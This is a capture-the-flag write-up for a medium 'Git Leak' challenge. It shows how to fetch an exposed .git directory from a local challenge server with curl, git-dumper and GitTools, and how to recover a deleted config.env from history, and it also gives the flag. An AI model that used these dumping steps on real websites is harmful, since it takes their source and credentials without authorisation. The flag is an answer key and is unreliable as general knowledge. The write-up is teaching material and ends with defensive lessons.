# 🔐 DevFolio Git Leak - Writeup

## Challenge Overview
**Name:** The Git Leak  
**Category:** Information Disclosure / Git Forensics  
**Difficulty:** Medium  
**Flag:** `STELKCSC{g1t_3xp0s3d_s3cr3ts_l34k3d}`

## Discovery

### Step 1: Reconnaissance
```bash
# Visit the website
curl http://localhost:5007

# Check common sensitive paths
curl http://localhost:5007/.git/
# Returns: directory listing!
```

### Step 2: Explore Git Structure
```bash
# Check git config
curl http://localhost:5007/.git/config

# Check git logs
curl http://localhost:5007/.git/logs/HEAD
```

## Solution Methods

### Method 1: Manual Git Exploration
```bash
# Get commit history
curl http://localhost:5007/.git/logs/HEAD

# Find interesting commits
# Notice: "Removed sensitive config file"

# Get the objects
curl http://localhost:5007/.git/objects/pack/
```

### Method 2: Using git-dumper (Recommended)
```bash
# Install git-dumper
pip install git-dumper

# Dump the .git directory
git-dumper http://localhost:5007/.git/ output_dir

# Enter the directory
cd output_dir

# Check git log
git log --oneline
# Shows: 
# abc1234 Added portfolio website files
# def5678 Removed sensitive config file
# 789abcd Initial commit - added config

# Check the first commit
git checkout 789abcd
# OR
git show 789abcd:config.env
```

### Method 3: GitTools
```bash
# Clone GitTools
git clone https://github.com/internetwache/GitTools

# Use Dumper
./GitTools/Dumper/gitdumper.sh http://localhost:5007/.git/ output

# Use Extractor
./GitTools/Extractor/extractor.sh output extracted
```

## Flag
```
STELKCSC{g1t_3xp0s3d_s3cr3ts_l34k3d}
```

Found in `config.env` from the first commit.

## Key Takeaways
1. **Never deploy .git to production** - Use `.dockerignore` or proper build processes
2. **Git history is permanent** - Deleting a file doesn't remove it from history
3. **Sensitive data needs rotation** - If leaked, change all credentials immediately
